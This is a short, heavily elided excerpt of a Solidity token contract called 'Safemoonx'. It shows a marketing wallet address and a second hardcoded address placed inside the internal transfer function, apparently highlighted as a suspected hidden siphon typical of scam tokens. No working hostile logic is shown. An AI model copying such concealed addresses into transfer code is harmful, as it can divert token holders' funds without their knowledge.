...
contract Safemoonx is Context, IERC20, Ownable {
    ...
    address public  _marketingWallet = 0x5c85756CBE458d40a7298c611eF246f8bF4952C0;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x25C31ec3B96c8CAf68288A869F9D12FD1f00d9Bf;
